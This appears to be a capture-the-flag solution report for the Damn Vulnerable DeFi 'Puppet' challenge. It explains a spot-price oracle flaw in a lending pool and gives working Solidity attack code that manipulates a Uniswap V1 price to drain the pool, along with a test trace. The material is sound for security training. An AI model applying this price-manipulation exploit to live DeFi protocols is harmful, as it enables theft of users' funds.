# Damn Vulnerable DeFi - Puppet - Solution Report

## Problem Analysis

### Contract Summary

The challenge involves three main contracts:

1. `PuppetPool`: A lending pool that allows users to borrow Damn Valuable Tokens (DVTs) by depositing twice the borrow amount in ETH as collateral. Key functions include:

   - `borrow(uint256 amount, address recipient)`: Allows borrowing tokens after depositing the required collateral.
   - `calculateDepositRequired(uint256 amount)`: Calculates the required ETH deposit for a given DVT amount.
   - `_computeOraclePrice()`: Computes the price of DVT in ETH based on the Uniswap V1 exchange balance.

2. `DamnValuableToken`: An ERC20 token contract representing the DVT.

3. `IUniswapV1Exchange`: An interface representing the Uniswap V1 exchange, used for token-ETH swaps and liquidity operations.

### Initial Setup

- Uniswap V1 Exchange: 10 ETH and 10 DVT in liquidity
- Lending Pool: 100,000 DVT in liquidity
- Player: 25 ETH and 1,000 DVT

### Success Criteria

To solve the challenge, the player must:

1. Execute a single transaction
2. Drain all tokens (100,000 DVT) from the lending pool
3. Deposit the drained tokens into the designated recovery account

The challenge is considered solved when:

- The player has executed only one transaction
- The lending pool's DVT balance is zero
- The recovery account's DVT balance is at least 100,000 DVT (the initial pool balance)

## Vulnerability

The main vulnerability in this challenge lies in the `PuppetPool` contract's pricing mechanism, specifically in the `_computeOraclePrice()` function:

```solidity
function _computeOraclePrice() private view returns (uint256) {
    // calculates the price of the token in wei according to Uniswap pair
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

This function has two critical issues:

1. **Centralized Oracle**: The function relies solely on the Uniswap V1 exchange's balance to determine the price of DVT. This makes it vulnerable to manipulation, as a single liquidity pool with relatively low liquidity is used as the price oracle.

2. **Spot Price Vulnerability**: The price is calculated based on the current spot price in the Uniswap pool, without any time-weighted average or other mechanism to protect against short-term price fluctuations or manipulations.

These vulnerabilities allow an attacker to manipulate the price of DVT in the Uniswap exchange, which directly affects the collateral requirements in the `PuppetPool`. By artificially inflating the ETH/DVT price, an attacker can drastically reduce the amount of ETH collateral required to borrow DVT from the pool.

The `calculateDepositRequired` function uses this vulnerable price oracle:

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
}
```

This means that if an attacker can manipulate the price to be very low, they can borrow a large amount of DVT with minimal ETH collateral, potentially draining the entire pool.

## Attack Method

The attack exploits the vulnerable price oracle in the `PuppetPool` contract by manipulating the Uniswap V1 exchange. The attack procedure is as follows:

1. **Manipulate Uniswap Price**:

   - The attacker sells a large amount of DVT to the Uniswap exchange.
   - This drastically increases the ETH balance and decreases the DVT balance in the Uniswap pool.
   - As a result, the price of DVT in terms of ETH (as calculated by `_computeOraclePrice()`) becomes extremely low.

2. **Calculate Reduced Collateral Requirement**:

   - Due to the manipulated price, the `calculateDepositRequired()` function now returns a much lower ETH amount required as collateral for borrowing DVT.

3. **Borrow DVT from PuppetPool**:

   - The attacker can now borrow all 100,000 DVT from the `PuppetPool` by providing only a small amount of ETH as collateral.
   - This is possible because the collateral requirement has been artificially reduced due to the price manipulation.

4. **Transfer Borrowed DVT**:

   - The attacker transfers all the borrowed DVT to the designated recovery address.

5. **Profit**:
   - The attacker now controls all 100,000 DVT from the pool, having spent only a fraction of their initial ETH balance.

This attack takes advantage of the fact that the `PuppetPool` uses the Uniswap exchange as a price oracle without any safeguards against manipulation. By executing a large trade on Uniswap, the attacker can temporarily skew the price, allowing them to drain the entire lending pool with minimal collateral.

The key to this attack is having enough initial DVT to significantly impact the Uniswap pool's balance. The attacker starts with 1,000 DVT, which is sufficient to manipulate the price given the pool's initial liquidity of only 10 ETH and 10 DVT.

## Proof of Concept (PoC)

### Core Implementation

To execute the attack while meeting the single transaction requirement, we use a dedicated `PuppetAttacker` contract. This contract is deployed and called in a single transaction from the player's account.

The attack is implemented in the `PuppetAttacker` contract and executed through the `test_puppet` function in the `PuppetChallenge` contract:

```solidity
function test_puppet() public checkSolvedByPlayer {
    // Deploy the attacker contract
    PuppetAttacker attacker = new PuppetAttacker(uniswapV1Exchange, lendingPool, token, recovery);

    // Calculate the amount of DVT to sell (leave 1 DVT for rounding error)
    uint256 dvtToSell = token.balanceOf(player) - 1;

    // Approve the attack contract to spend the calculated amount of player's DVT
    token.approve(address(attacker), dvtToSell);

    // Execute the attack
    attacker.attack{value: player.balance}(dvtToSell);
}
```

The `PuppetAttacker` contract implements the attack logic following these steps:

1. **Manipulate Uniswap Price**:

```solidity
// Transfer DVT from player to this contract
token.transferFrom(msg.sender, address(this), dvtToSell);

// Approve Uniswap to spend our DVT
token.approve(address(uniswapExchange), dvtToSell);

// Perform the swap to dump DVT price
uniswapExchange.tokenToEthSwapInput(
    dvtToSell,
    1 wei, // Accept any amount of ETH, to avoid reverting with large price impact
    block.timestamp + 300 // 5 minutes deadline
);
```

2. **Borrow DVT from PuppetPool**:

```solidity
// Borrow all DVT from the lending pool
uint256 poolBalance = token.balanceOf(address(lendingPool));
lendingPool.borrow{value: address(this).balance}(poolBalance, address(this));
```

3. **Transfer Borrowed DVT**:

```solidity
// Transfer all DVT to recovery address
token.transfer(recovery, token.balanceOf(address(this)));
```

4. **Return Excess ETH**:

```solidity
// Transfer any remaining ETH back to player
payable(msg.sender).transfer(address(this).balance);
```

This implementation executes the entire attack in a single transaction, manipulating the Uniswap price, borrowing all DVT from the lending pool, and transferring the borrowed tokens to the recovery address.

### Running Result

```
    ├─ [0] VM::getNonce(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 1
    ├─ [0] VM::assertEq(1, 1, "Player executed more than one tx") [staticcall]
    │   └─ ← [Return]
    ├─ [519] DamnValuableToken::balanceOf(PuppetPool: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Pool still has tokens") [staticcall]
    │   └─ ← [Return]
    ├─ [519] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    ├─ [0] VM::assertGe(100000000000000000000000 [1e23], 100000000000000000000000 [1e23], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]
```
